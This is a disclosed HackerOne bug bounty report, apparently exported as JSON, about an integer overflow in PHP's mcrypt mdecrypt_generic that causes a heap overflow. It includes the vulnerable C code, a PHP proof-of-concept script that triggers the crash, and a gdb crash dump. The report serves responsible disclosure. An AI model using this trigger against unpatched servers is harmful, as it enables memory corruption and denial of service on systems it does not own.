{"id":146360,"global_id":"Z2lkOi8vaGFja2Vyb25lL1JlcG9ydC8xNDYzNjA=","url":"https://hackerone.com/reports/146360","title":"Heap Overflow Due To Integer Overflow","state":"Closed","substate":"resolved","readable_substate":"Resolved","created_at":"2016-06-22T02:41:10.357Z","submitted_at":"2016-06-22T02:41:10.357Z","is_member_of_team?":false,"reporter":{"disabled":false,"username":"hoangnguyen","url":"/hoangnguyen","profile_picture_urls":{"small":"https://profile-photos.hackerone-user-content.com/variants/000/074/688/42c5ca5265ff965283d70fc52df2681dfd648d44_original.png/3afcb5c896247e7ee8ada31b1c1eb8657e22241f911093acfe4ec7e97a3a959a"},"is_me?":false,"cleared":false,"hackerone_triager":false,"hacker_mediation":false},"team":{"id":29,"url":"https://hackerone.com/ibb-php","handle":"ibb-php","profile_picture_urls":{"small":"https://profile-photos.hackerone-user-content.com/variants/000/000/029/99087dbbdf52fc3ce3acbf16aa33a5c4f5e2c111_original.png/3afcb5c896247e7ee8ada31b1c1eb8657e22241f911093acfe4ec7e97a3a959a","medium":"https://profile-photos.hackerone-user-content.com/variants/000/000/029/99087dbbdf52fc3ce3acbf16aa33a5c4f5e2c111_original.png/eb31823a4cc9f6b6bb4db930ffdf512533928a68a4255fb50a83180281a60da5"},"permissions":[],"submission_state":"paused","default_currency":"usd","awards_miles":false,"offers_bounties":true,"state":"public_mode","only_cleared_hackers":false,"profile":{"name":"PHP (IBB)","twitter_handle":"","website":"http://www.php.net","about":""}},"has_bounty?":true,"in_validation?":false,"rejected_anc_report_that_can_be_sent_back_to_anc_triagers?":false,"can_view_team":true,"can_view_report":true,"is_external_bug":false,"is_published":false,"is_participant":false,"stage":4,"public":true,"visibility":"full","cve_ids":[],"singular_disclosure_disabled":false,"disclosed_at":"2019-11-12T09:35:35.784Z","bug_reporter_agreed_on_going_public_at":null,"team_member_agreed_on_going_public_at":"2019-10-13T09:35:08.218Z","comments_closed?":false,"facebook_team?":false,"team_private?":false,"vulnerability_information":"Bug reported : https://bugs.php.net/bug.php?id=72455\n\n```\nPHP_FUNCTION(mdecrypt_generic)\n{\n    **** snip***\n    int block_size, data_size; // signed int\n    /* Check blocksize */\n    if (mcrypt_enc_is_block_mode(pm-\u003etd) == 1) { /* It's a block algorithm */\n\t\tblock_size = mcrypt_enc_get_block_size(pm-\u003etd);\n\t\tdata_size = ((((int)data_len - 1) / block_size) + 1) * block_size;\n\t\tdata_s = emalloc(data_size + 1);\n\t\tmemset(data_s, 0, data_size);\n\t\tmemcpy(data_s, data, data_len);\n\n    } else { /* It's not a block algorithm */\n\t\tdata_size = (int)data_len;\n\t\tdata_s = emalloc(data_size + 1);\n\t\tmemset(data_s, 0, data_size);\n\t\tmemcpy(data_s, data, data_len);\n\t}\n```\n\nAs you can see data_size follow by formular : data_size = ((((int)data_len - 1) / block_size) + 1) * block_size; because data_size is int. If attacker control data_len for example data_len = 0xffffffff then data_size = 0x20, after that, they will emalloc(0x20) bytes and then use memcpy data to data_s with data_len is 0xffffffff in unsigned int is 4294967295, this leads to heap overflow.\n\nAnother code block that lead to integer overflow when check encrypt data is not a block cipher. They just cast data_len from unsigned int to signed int ```data_size = (int)data_len;```, if attacker control data_len = 0xffffffff (in signed int is -1) so that data_size+1 is 0 and pass this value to emalloc, after that they use data_len (is unsigned integer is 4294967295) to copy n bytes data to data_s, this leads to heap overflow again.\n\nTest Script:\n```\n\u003c?php\n\t/* Data */\n\tini_set('memory_limit',-1);\n\n\t$key = str_repeat('C', 32);\n\t$str = str_repeat('A', 0xffffffff);\n\n\t// $td = mcrypt_module_open('des', '', 'ecb', '');\n\t$td = mcrypt_module_open(MCRYPT_RIJNDAEL_256, '', 'cbc', ''); // block cipher (case 1)\n\t// $td = mcrypt_module_open('rijndael-256', '', 'ofb', ''); // not block cipher (case 2)\n\n\t$ks = mcrypt_enc_get_key_size($td);\n\n\t$iv = str_repeat('D', 32);\n\n\tif (mcrypt_generic_init($td, $key, $iv) != -1) {\n\t\tmcrypt_generic_init($td, $key, $iv);\n\t\t$p_t = mdecrypt_generic($td, $str);\n\n\t\tmcrypt_generic_deinit($td);\n\t\tmcrypt_module_close($td);\n\t}\n?\u003e\n```\n\nCrash:\n```\ngdb-peda$ r test.php\nStarting program: /media/Data/Build/audit/php7.0.7 test.php\n\nProgram received signal SIGSEGV, Segmentation fault.\n[----------------------------------registers-----------------------------------]\nRAX: 0x7ffff427c320 --\u003e 0x0\nRBX: 0x0\nRCX: 0x8000f427c310\nRDX: 0xffe7c2d0\nRSI: 0x7ffef3d83d38 ('A' \u003crepeats 200 times\u003e...)\nRDI: 0x7ffff43fffc0 ('A' \u003crepeats 64 times\u003e\u003cerror: Cannot access memory at address 0x7ffff4400000\u003e)\nRBP: 0x7fffffffaf50 --\u003e 0x7fffffffaf80 --\u003e 0x7fffffffafb0 --\u003e 0x7fffffffaff0 --\u003e 0x7fffffffb100 --\u003e 0x7fffffffd400 --\u003e 0x7fffffffe780 --\u003e 0x7fffffffe8d0 --\u003e 0x9a0b00 (\u003c__libc_csu_init\u003e:\tpush   r15)\nRSP: 0x7fffffffaee8 --\u003e 0x64e590 (\u003czif_mdecrypt_generic+401\u003e:\tjmp    0x64e5f2 \u003czif_mdecrypt_generic+499\u003e)\nRIP: 0x7ffff6c2ba0e (\u003c__memcpy_avx_unaligned+830\u003e:\tvmovntdq YMMWORD PTR [rdi+0x40],ymm2)\nR8 : 0x7ffff427c320 --\u003e 0x0\nR9 : 0x0\nR10: 0x20 (' ')\nR11: 0x7ffff77746e0 (\u003cmcrypt_enc_get_block_size\u003e:\tmov    rax,QWORD PTR [rdi+0xc8])\nR12: 0x424690 (\u003c_start\u003e:\txor    ebp,ebp)\nR13: 0x7fffffffe9b0 --\u003e 0x2\nR14: 0x7ffff4214030 --\u003e 0x7ffff427f5c0 ('A' \u003crepeats 200 times\u003e...)\nR15: 0x7ffff427f5c0 ('A' \u003crepeats 200 times\u003e...)\nEFLAGS: 0x10203 (CARRY parity adjust zero sign trap INTERRUPT direction overflow)\n[-------------------------------------code-------------------------------------]\n   0x7ffff6c2ba01 \u003c__memcpy_avx_unaligned+817\u003e:\tsub    rsi,0xffffffffffffff80\n   0x7ffff6c2ba05 \u003c__memcpy_avx_unaligned+821\u003e:\tvmovntdq YMMWORD PTR [rdi],ymm0\n   0x7ffff6c2ba09 \u003c__memcpy_avx_unaligned+825\u003e:\tvmovntdq YMMWORD PTR [rdi+0x20],ymm1\n=\u003e 0x7ffff6c2ba0e \u003c__memcpy_avx_unaligned+830\u003e:\tvmovntdq YMMWORD PTR [rdi+0x40],ymm2\n   0x7ffff6c2ba13 \u003c__memcpy_avx_unaligned+835\u003e:\tvmovntdq YMMWORD PTR [rdi+0x60],ymm3\n   0x7ffff6c2ba18 \u003c__memcpy_avx_unaligned+840\u003e:\tsub    rdi,0xffffffffffffff80\n   0x7ffff6c2ba1c \u003c__memcpy_avx_unaligned+844\u003e:\tadd    rdx,0xffffffffffffff80\n   0x7ffff6c2ba20 \u003c__memcpy_avx_unaligned+848\u003e:\tjb     0x7ffff6c2b9e0 \u003c__memcpy_avx_unaligned+784\u003e\n[------------------------------------stack-------------------------------------]\n0000| 0x7fffffffaee8 --\u003e 0x64e590 (\u003czif_mdecrypt_generic+401\u003e:\tjmp    0x64e5f2 \u003czif_mdecrypt_generic+499\u003e)\n0008| 0x7fffffffaef0 --\u003e 0x7ffff42141e0 --\u003e 0x0\n0016| 0x7fffffffaef8 --\u003e 0x7ffff4214220 --\u003e 0x0\n0024| 0x7fffffffaf00 --\u003e 0xfffffda9000000e2\n0032| 0x7fffffffaf08 --\u003e 0x2000000020 (' ')\n0040| 0x7fffffffaf10 --\u003e 0x7ffff4214280 --\u003e 0x7ffff42010e0 --\u003e 0x900000002\n0048| 0x7fffffffaf18 --\u003e 0x7ffef3c00018 ('A' \u003crepeats 200 times\u003e...)\n0056| 0x7fffffffaf20 --\u003e 0xfffffff0\n[------------------------------------------------------------------------------]\nLegend: code, data, rodata, value\nStopped reason: SIGSEGV\n__memcpy_avx_unaligned () at ../sysdeps/x86_64/multiarch/memcpy-avx-unaligned.S:272\n272\t../sysdeps/x86_64/multiarch/memcpy-avx-unaligned.S: No such file or directory.\ngdb-peda$ bt\n#0  __memcpy_avx_unaligned () at ../sysdeps/x86_64/multiarch/memcpy-avx-unaligned.S:272\n#1  0x000000000064e590 in zif_mdecrypt_generic (execute_data=0x7ffff4214220, return_value=0x7ffff42141e0) at /home/hoangnguyen/Data/Build/audit/php-7.0.7/ext/mcrypt/mcrypt.c:688\n#2  0x000000000092cb3e in ZEND_DO_ICALL_SPEC_HANDLER () at /home/hoangnguyen/Data/Build/audit/php-7.0.7/Zend/zend_vm_execute.h:586\n#3  0x000000000092c56a in execute_ex (ex=0x7ffff4214030) at /home/hoangnguyen/Data/Build/audit/php-7.0.7/Zend/zend_vm_execute.h:414\n#4  0x000000000092c67b in zend_execute (op_array=0x7ffff427e000, return_value=0x0) at /home/hoangnguyen/Data/Build/audit/php-7.0.7/Zend/zend_vm_execute.h:458\n#5  0x00000000008cd94a in zend_execute_scripts (type=0x8, retval=0x0, file_count=0x3) at /home/hoangnguyen/Data/Build/audit/php-7.0.7/Zend/zend.c:1427\n#6  0x00000000008362ea in php_execute_script (primary_file=0x7fffffffd630) at /home/hoangnguyen/Data/Build/audit/php-7.0.7/main/main.c:2494\n#7  0x0000000000995591 in do_cli (argc=0x2, argv=0x115d440) at /home/hoangnguyen/Data/Build/audit/php-7.0.7/sapi/cli/php_cli.c:974\n#8  0x000000000099675f in main (argc=0x2, argv=0x115d440) at /home/hoangnguyen/Data/Build/audit/php-7.0.7/sapi/cli/php_cli.c:1344\n#9  0x00007ffff6afe830 in __libc_start_main (main=0x995f54 \u003cmain\u003e, argc=0x2, argv=0x7fffffffe9b8, init=\u003coptimized out\u003e, fini=\u003coptimized out\u003e, rtld_fini=\u003coptimized out\u003e,\n    stack_end=0x7fffffffe9a8) at ../csu/libc-start.c:291\n#10 0x00000000004246b9 in _start ()\n```","vulnerability_information_html":"\u003cp\u003eBug reported : \u003ca title=\"https://bugs.php.net/bug.php?id=72455\" href=\"/redirect?url=https%3A%2F%2Fbugs.php.net%2Fbug.php%3Fid%3D72455\" target=\"_blank\" rel=\"nofollow noopener noreferrer\"\u003e\u003cspan\u003ehttps://bugs.php.net/bug.php?id=72455\u003c/span\u003e\u003ci class=\"icon-external-link\"\u003e\u003c/i\u003e\u003c/a\u003e\u003c/p\u003e\n\u003cdiv class=\"highlight\"\u003e\u003cpre class=\"highlight plaintext\"\u003e\u003ccode\u003ePHP_FUNCTION(mdecrypt_generic)\n{\n    **** snip***\n    int block_size, data_size; // signed int\n    /* Check blocksize */\n    if (mcrypt_enc_is_block_mode(pm-\u0026gt;td) == 1) { /* It\u0026#39;s a block algorithm */\n        block_size = mcrypt_enc_get_block_size(pm-\u0026gt;td);\n        data_size = ((((int)data_len - 1) / block_size) + 1) * block_size;\n        data_s = emalloc(data_size + 1);\n        memset(data_s, 0, data_size);\n        memcpy(data_s, data, data_len);\n\n    } else { /* It\u0026#39;s not a block algorithm */\n        data_size = (int)data_len;\n        data_s = emalloc(data_size + 1);\n        memset(data_s, 0, data_size);\n        memcpy(data_s, data, data_len);\n    }\n\u003c/code\u003e\u003c/pre\u003e\u003c/div\u003e\n\u003cp\u003eAs you can see data_size follow by formular : data_size = ((((int)data_len - 1) / block_size) + 1) * block_size; because data_size is int. If attacker control data_len for example data_len = 0xffffffff then data_size = 0x20, after that, they will emalloc(0x20) bytes and then use memcpy data to data_s with data_len is 0xffffffff in unsigned int is 4294967295, this leads to heap overflow.\u003c/p\u003e\n\n\u003cp\u003eAnother code block that lead to integer overflow when check encrypt data is not a block cipher. They just cast data_len from unsigned int to signed int \u003ccode\u003edata_size = (int)data_len;\u003c/code\u003e, if attacker control data_len = 0xffffffff (in signed int is -1) so that data_size+1 is 0 and pass this value to emalloc, after that they use data_len (is unsigned integer is 4294967295) to copy n bytes data to data_s, this leads to heap overflow again.\u003c/p\u003e\n\n\u003cp\u003eTest Script:\u003c/p\u003e\n\u003cdiv class=\"highlight\"\u003e\u003cpre class=\"highlight php\"\u003e\u003ccode\u003e\u003cspan class=\"cp\"\u003e\u0026lt;?php\u003c/span\u003e\n    \u003cspan class=\"cm\"\u003e/* Data */\u003c/span\u003e\n    \u003cspan class=\"nb\"\u003eini_set\u003c/span\u003e\u003cspan class=\"p\"\u003e(\u003c/span\u003e\u003cspan class=\"s1\"\u003e\u0026#39;memory_limit\u0026#39;\u003c/span\u003e\u003cspan class=\"p\"\u003e,\u003c/span\u003e\u003cspan class=\"o\"\u003e-\u003c/span\u003e\u003cspan class=\"mi\"\u003e1\u003c/span\u003e\u003cspan class=\"p\"\u003e);\u003c/span\u003e\n\n    \u003cspan class=\"nv\"\u003e$key\u003c/span\u003e \u003cspan class=\"o\"\u003e=\u003c/span\u003e \u003cspan class=\"nb\"\u003estr_repeat\u003c/span\u003e\u003cspan class=\"p\"\u003e(\u003c/span\u003e\u003cspan class=\"s1\"\u003e\u0026#39;C\u0026#39;\u003c/span\u003e\u003cspan class=\"p\"\u003e,\u003c/span\u003e \u003cspan class=\"mi\"\u003e32\u003c/span\u003e\u003cspan class=\"p\"\u003e);\u003c/span\u003e\n    \u003cspan class=\"nv\"\u003e$str\u003c/span\u003e \u003cspan class=\"o\"\u003e=\u003c/span\u003e \u003cspan class=\"nb\"\u003estr_repeat\u003c/span\u003e\u003cspan class=\"p\"\u003e(\u003c/span\u003e\u003cspan class=\"s1\"\u003e\u0026#39;A\u0026#39;\u003c/span\u003e\u003cspan class=\"p\"\u003e,\u003c/span\u003e \u003cspan class=\"mh\"\u003e0xffffffff\u003c/span\u003e\u003cspan class=\"p\"\u003e);\u003c/span\u003e\n\n    \u003cspan class=\"c1\"\u003e// $td = mcrypt_module_open(\u0026#39;des\u0026#39;, \u0026#39;\u0026#39;, \u0026#39;ecb\u0026#39;, \u0026#39;\u0026#39;);\u003c/span\u003e\n    \u003cspan class=\"nv\"\u003e$td\u003c/span\u003e \u003cspan class=\"o\"\u003e=\u003c/span\u003e \u003cspan class=\"nb\"\u003emcrypt_module_open\u003c/span\u003e\u003cspan class=\"p\"\u003e(\u003c/span\u003e\u003cspan class=\"nx\"\u003eMCRYPT_RIJNDAEL_256\u003c/span\u003e\u003cspan class=\"p\"\u003e,\u003c/span\u003e \u003cspan class=\"s1\"\u003e\u0026#39;\u0026#39;\u003c/span\u003e\u003cspan class=\"p\"\u003e,\u003c/span\u003e \u003cspan class=\"s1\"\u003e\u0026#39;cbc\u0026#39;\u003c/span\u003e\u003cspan class=\"p\"\u003e,\u003c/span\u003e \u003cspan class=\"s1\"\u003e\u0026#39;\u0026#39;\u003c/span\u003e\u003cspan class=\"p\"\u003e);\u003c/span\u003e \u003cspan class=\"c1\"\u003e// block cipher (case 1)\u003c/span\u003e\n    \u003cspan class=\"c1\"\u003e// $td = mcrypt_module_open(\u0026#39;rijndael-256\u0026#39;, \u0026#39;\u0026#39;, \u0026#39;ofb\u0026#39;, \u0026#39;\u0026#39;); // not block cipher (case 2)\u003c/span\u003e\n\n    \u003cspan class=\"nv\"\u003e$ks\u003c/span\u003e \u003cspan class=\"o\"\u003e=\u003c/span\u003e \u003cspan class=\"nb\"\u003emcrypt_enc_get_key_size\u003c/span\u003e\u003cspan class=\"p\"\u003e(\u003c/span\u003e\u003cspan class=\"nv\"\u003e$td\u003c/span\u003e\u003cspan class=\"p\"\u003e);\u003c/span\u003e\n\n    \u003cspan class=\"nv\"\u003e$iv\u003c/span\u003e \u003cspan class=\"o\"\u003e=\u003c/span\u003e \u003cspan class=\"nb\"\u003estr_repeat\u003c/span\u003e\u003cspan class=\"p\"\u003e(\u003c/span\u003e\u003cspan class=\"s1\"\u003e\u0026#39;D\u0026#39;\u003c/span\u003e\u003cspan class=\"p\"\u003e,\u003c/span\u003e \u003cspan class=\"mi\"\u003e32\u003c/span\u003e\u003cspan class=\"p\"\u003e);\u003c/span\u003e\n\n    \u003cspan class=\"k\"\u003eif\u003c/span\u003e \u003cspan class=\"p\"\u003e(\u003c/span\u003e\u003cspan class=\"nb\"\u003emcrypt_generic_init\u003c/span\u003e\u003cspan class=\"p\"\u003e(\u003c/span\u003e\u003cspan class=\"nv\"\u003e$td\u003c/span\u003e\u003cspan class=\"p\"\u003e,\u003c/span\u003e \u003cspan class=\"nv\"\u003e$key\u003c/span\u003e\u003cspan class=\"p\"\u003e,\u003c/span\u003e \u003cspan class=\"nv\"\u003e$iv\u003c/span\u003e\u003cspan class=\"p\"\u003e)\u003c/span\u003e \u003cspan class=\"o\"\u003e!=\u003c/span\u003e \u003cspan class=\"o\"\u003e-\u003c/span\u003e\u003cspan class=\"mi\"\u003e1\u003c/span\u003e\u003cspan class=\"p\"\u003e)\u003c/span\u003e \u003cspan class=\"p\"\u003e{\u003c/span\u003e\n        \u003cspan class=\"nb\"\u003emcrypt_generic_init\u003c/span\u003e\u003cspan class=\"p\"\u003e(\u003c/span\u003e\u003cspan class=\"nv\"\u003e$td\u003c/span\u003e\u003cspan class=\"p\"\u003e,\u003c/span\u003e \u003cspan class=\"nv\"\u003e$key\u003c/span\u003e\u003cspan class=\"p\"\u003e,\u003c/span\u003e \u003cspan class=\"nv\"\u003e$iv\u003c/span\u003e\u003cspan class=\"p\"\u003e);\u003c/span\u003e\n        \u003cspan class=\"nv\"\u003e$p_t\u003c/span\u003e \u003cspan class=\"o\"\u003e=\u003c/span\u003e \u003cspan class=\"nb\"\u003emdecrypt_generic\u003c/span\u003e\u003cspan class=\"p\"\u003e(\u003c/span\u003e\u003cspan class=\"nv\"\u003e$td\u003c/span\u003e\u003cspan class=\"p\"\u003e,\u003c/span\u003e \u003cspan class=\"nv\"\u003e$str\u003c/span\u003e\u003cspan class=\"p\"\u003e);\u003c/span\u003e\n\n        \u003cspan class=\"nb\"\u003emcrypt_generic_deinit\u003c/span\u003e\u003cspan class=\"p\"\u003e(\u003c/span\u003e\u003cspan class=\"nv\"\u003e$td\u003c/span\u003e\u003cspan class=\"p\"\u003e);\u003c/span\u003e\n        \u003cspan class=\"nb\"\u003emcrypt_module_close\u003c/span\u003e\u003cspan class=\"p\"\u003e(\u003c/span\u003e\u003cspan class=\"nv\"\u003e$td\u003c/span\u003e\u003cspan class=\"p\"\u003e);\u003c/span\u003e\n    \u003cspan class=\"p\"\u003e}\u003c/span\u003e\n\u003cspan class=\"cp\"\u003e?\u0026gt;\u003c/span\u003e\n\u003c/code\u003e\u003c/pre\u003e\u003c/div\u003e\n\u003cp\u003eCrash:\u003c/p\u003e\n\u003cdiv class=\"highlight\"\u003e\u003cpre class=\"highlight plaintext\"\u003e\u003ccode\u003egdb-peda$ r test.php\nStarting program: /media/Data/Build/audit/php7.0.7 test.php\n\nProgram received signal SIGSEGV, Segmentation fault.\n[----------------------------------registers-----------------------------------]\nRAX: 0x7ffff427c320 --\u0026gt; 0x0\nRBX: 0x0\nRCX: 0x8000f427c310\nRDX: 0xffe7c2d0\nRSI: 0x7ffef3d83d38 (\u0026#39;A\u0026#39; \u0026lt;repeats 200 times\u0026gt;...)\nRDI: 0x7ffff43fffc0 (\u0026#39;A\u0026#39; \u0026lt;repeats 64 times\u0026gt;\u0026lt;error: Cannot access memory at address 0x7ffff4400000\u0026gt;)\nRBP: 0x7fffffffaf50 --\u0026gt; 0x7fffffffaf80 --\u0026gt; 0x7fffffffafb0 --\u0026gt; 0x7fffffffaff0 --\u0026gt; 0x7fffffffb100 --\u0026gt; 0x7fffffffd400 --\u0026gt; 0x7fffffffe780 --\u0026gt; 0x7fffffffe8d0 --\u0026gt; 0x9a0b00 (\u0026lt;__libc_csu_init\u0026gt;:   push   r15)\nRSP: 0x7fffffffaee8 --\u0026gt; 0x64e590 (\u0026lt;zif_mdecrypt_generic+401\u0026gt;:   jmp    0x64e5f2 \u0026lt;zif_mdecrypt_generic+499\u0026gt;)\nRIP: 0x7ffff6c2ba0e (\u0026lt;__memcpy_avx_unaligned+830\u0026gt;:  vmovntdq YMMWORD PTR [rdi+0x40],ymm2)\nR8 : 0x7ffff427c320 --\u0026gt; 0x0\nR9 : 0x0\nR10: 0x20 (\u0026#39; \u0026#39;)\nR11: 0x7ffff77746e0 (\u0026lt;mcrypt_enc_get_block_size\u0026gt;:   mov    rax,QWORD PTR [rdi+0xc8])\nR12: 0x424690 (\u0026lt;_start\u0026gt;:    xor    ebp,ebp)\nR13: 0x7fffffffe9b0 --\u0026gt; 0x2\nR14: 0x7ffff4214030 --\u0026gt; 0x7ffff427f5c0 (\u0026#39;A\u0026#39; \u0026lt;repeats 200 times\u0026gt;...)\nR15: 0x7ffff427f5c0 (\u0026#39;A\u0026#39; \u0026lt;repeats 200 times\u0026gt;...)\nEFLAGS: 0x10203 (CARRY parity adjust zero sign trap INTERRUPT direction overflow)\n[-------------------------------------code-------------------------------------]\n   0x7ffff6c2ba01 \u0026lt;__memcpy_avx_unaligned+817\u0026gt;: sub    rsi,0xffffffffffffff80\n   0x7ffff6c2ba05 \u0026lt;__memcpy_avx_unaligned+821\u0026gt;: vmovntdq YMMWORD PTR [rdi],ymm0\n   0x7ffff6c2ba09 \u0026lt;__memcpy_avx_unaligned+825\u0026gt;: vmovntdq YMMWORD PTR [rdi+0x20],ymm1\n=\u0026gt; 0x7ffff6c2ba0e \u0026lt;__memcpy_avx_unaligned+830\u0026gt;: vmovntdq YMMWORD PTR [rdi+0x40],ymm2\n   0x7ffff6c2ba13 \u0026lt;__memcpy_avx_unaligned+835\u0026gt;: vmovntdq YMMWORD PTR [rdi+0x60],ymm3\n   0x7ffff6c2ba18 \u0026lt;__memcpy_avx_unaligned+840\u0026gt;: sub    rdi,0xffffffffffffff80\n   0x7ffff6c2ba1c \u0026lt;__memcpy_avx_unaligned+844\u0026gt;: add    rdx,0xffffffffffffff80\n   0x7ffff6c2ba20 \u0026lt;__memcpy_avx_unaligned+848\u0026gt;: jb     0x7ffff6c2b9e0 \u0026lt;__memcpy_avx_unaligned+784\u0026gt;\n[------------------------------------stack-------------------------------------]\n0000| 0x7fffffffaee8 --\u0026gt; 0x64e590 (\u0026lt;zif_mdecrypt_generic+401\u0026gt;:  jmp    0x64e5f2 \u0026lt;zif_mdecrypt_generic+499\u0026gt;)\n0008| 0x7fffffffaef0 --\u0026gt; 0x7ffff42141e0 --\u0026gt; 0x0\n0016| 0x7fffffffaef8 --\u0026gt; 0x7ffff4214220 --\u0026gt; 0x0\n0024| 0x7fffffffaf00 --\u0026gt; 0xfffffda9000000e2\n0032| 0x7fffffffaf08 --\u0026gt; 0x2000000020 (\u0026#39; \u0026#39;)\n0040| 0x7fffffffaf10 --\u0026gt; 0x7ffff4214280 --\u0026gt; 0x7ffff42010e0 --\u0026gt; 0x900000002\n0048| 0x7fffffffaf18 --\u0026gt; 0x7ffef3c00018 (\u0026#39;A\u0026#39; \u0026lt;repeats 200 times\u0026gt;...)\n0056| 0x7fffffffaf20 --\u0026gt; 0xfffffff0\n[------------------------------------------------------------------------------]\nLegend: code, data, rodata, value\nStopped reason: SIGSEGV\n__memcpy_avx_unaligned () at ../sysdeps/x86_64/multiarch/memcpy-avx-unaligned.S:272\n272 ../sysdeps/x86_64/multiarch/memcpy-avx-unaligned.S: No such file or directory.\ngdb-peda$ bt\n#0  __memcpy_avx_unaligned () at ../sysdeps/x86_64/multiarch/memcpy-avx-unaligned.S:272\n#1  0x000000000064e590 in zif_mdecrypt_generic (execute_data=0x7ffff4214220, return_value=0x7ffff42141e0) at /home/hoangnguyen/Data/Build/audit/php-7.0.7/ext/mcrypt/mcrypt.c:688\n#2  0x000000000092cb3e in ZEND_DO_ICALL_SPEC_HANDLER () at /home/hoangnguyen/Data/Build/audit/php-7.0.7/Zend/zend_vm_execute.h:586\n#3  0x000000000092c56a in execute_ex (ex=0x7ffff4214030) at /home/hoangnguyen/Data/Build/audit/php-7.0.7/Zend/zend_vm_execute.h:414\n#4  0x000000000092c67b in zend_execute (op_array=0x7ffff427e000, return_value=0x0) at /home/hoangnguyen/Data/Build/audit/php-7.0.7/Zend/zend_vm_execute.h:458\n#5  0x00000000008cd94a in zend_execute_scripts (type=0x8, retval=0x0, file_count=0x3) at /home/hoangnguyen/Data/Build/audit/php-7.0.7/Zend/zend.c:1427\n#6  0x00000000008362ea in php_execute_script (primary_file=0x7fffffffd630) at /home/hoangnguyen/Data/Build/audit/php-7.0.7/main/main.c:2494\n#7  0x0000000000995591 in do_cli (argc=0x2, argv=0x115d440) at /home/hoangnguyen/Data/Build/audit/php-7.0.7/sapi/cli/php_cli.c:974\n#8  0x000000000099675f in main (argc=0x2, argv=0x115d440) at /home/hoangnguyen/Data/Build/audit/php-7.0.7/sapi/cli/php_cli.c:1344\n#9  0x00007ffff6afe830 in __libc_start_main (main=0x995f54 \u0026lt;main\u0026gt;, argc=0x2, argv=0x7fffffffe9b8, init=\u0026lt;optimized out\u0026gt;, fini=\u0026lt;optimized out\u0026gt;, rtld_fini=\u0026lt;optimized out\u0026gt;,\n    stack_end=0x7fffffffe9a8) at ../csu/libc-start.c:291\n#10 0x00000000004246b9 in _start ()\n\u003c/code\u003e\u003c/pre\u003e\u003c/div\u003e","bounty_amount":"1000.0","formatted_bounty":"$1,000","weakness":{"id":2,"name":"Memory Corruption - Generic"},"original_report_id":null,"original_report_url":null,"attachments":[],"allow_singular_disclosure_at":"2019-11-12T09:35:08.303Z","allow_singular_disclosure_after":-35664952.90651254,"singular_disclosure_allowed":true,"vote_count":1,"voters":["dyabla"],"structured_scope":null,"abilities":{"assignable_team_members":[],"assignable_team_member_groups":[]},"can_edit_custom_fields_attributes":false,"activities":[{"id":1038982,"is_internal":false,"editable":false,"type":"Activities::BountyAwarded","message":"","markdown_message":"","automated_response":false,"created_at":"2016-06-26T22:29:43.584Z","updated_at":"2016-06-26T22:29:43.584Z","actor":{"url":"/ibb-php","ibb":true,"profile_picture_urls":{"medium":"https://profile-photos.hackerone-user-content.com/variants/000/000/029/99087dbbdf52fc3ce3acbf16aa33a5c4f5e2c111_original.png/eb31823a4cc9f6b6bb4db930ffdf512533928a68a4255fb50a83180281a60da5"},"profile":{"name":"PHP (IBB)"}},"bounty_amount":"1000.0","bounty_currency":"usd","genius_execution_id":null,"team_handle":"ibb-php","collaborator":{"username":"hoangnguyen","url":"/hoangnguyen"},"actor_is_team_member":false,"actor_is_concealed_member":false},{"id":1038983,"is_internal":false,"editable":false,"type":"Activities::BugResolved","message":"Thank you @hoangnguyen!","markdown_message":"\u003cp\u003eThank you \u003ca href=\"/hoangnguyen\"\u003e@hoangnguyen\u003c/a\u003e!\u003c/p\u003e\n","automated_response":false,"created_at":"2016-06-26T22:29:58.467Z","updated_at":"2016-06-26T22:29:58.467Z","actor":{"username":"arice","cleared":false,"url":"/arice","profile_picture_urls":{"medium":"https://profile-photos.hackerone-user-content.com/variants/000/000/020/83152cb2d070f3f6a63c1b61bae47257722b5ad2_original.jpeg/eb31823a4cc9f6b6bb4db930ffdf512533928a68a4255fb50a83180281a60da5"},"hackerone_triager":false,"hackerone_employee":true},"reporter":{"username":"hoangnguyen","url":"/hoangnguyen"},"genius_execution_id":null,"team_handle":"ibb-php","actor_is_team_member":false,"actor_is_concealed_member":false},{"id":6026366,"is_internal":false,"editable":false,"type":"Activities::AgreedOnGoingPublic","message":"","markdown_message":"","automated_response":false,"created_at":"2019-10-13T09:35:08.237Z","updated_at":"2019-10-13T09:35:08.237Z","first_to_agree":true,"actor":{"username":"reed","cleared":false,"url":"/reed","profile_picture_urls":{"medium":"https://profile-photos.hackerone-user-content.com/variants/000/003/132/66d7eadcea16b878bb67bfd697b9542250a801a7_original.jpg/eb31823a4cc9f6b6bb4db930ffdf512533928a68a4255fb50a83180281a60da5"},"hackerone_triager":false,"hackerone_employee":true},"genius_execution_id":null,"team_handle":"ibb-php","actor_is_team_member":true,"actor_is_concealed_member":false},{"id":6285842,"is_internal":false,"editable":false,"type":"Activities::ReportBecamePublic","message":"","markdown_message":"","automated_response":false,"created_at":"2019-11-12T09:35:35.835Z","updated_at":"2019-11-12T09:35:35.835Z","actor":{"url":"/ibb-php","ibb":true,"profile_picture_urls":{"medium":"https://profile-photos.hackerone-user-content.com/variants/000/000/029/99087dbbdf52fc3ce3acbf16aa33a5c4f5e2c111_original.png/eb31823a4cc9f6b6bb4db930ffdf512533928a68a4255fb50a83180281a60da5"},"profile":{"name":"PHP (IBB)"}},"genius_execution_id":null,"team_handle":"ibb-php","actor_is_team_member":false,"actor_is_concealed_member":false}],"activity_page_count":1,"activity_page_number":1,"summaries":[{"category":"team","can_view?":true,"can_create?":false},{"category":"researcher","can_view?":true,"can_create?":false}]}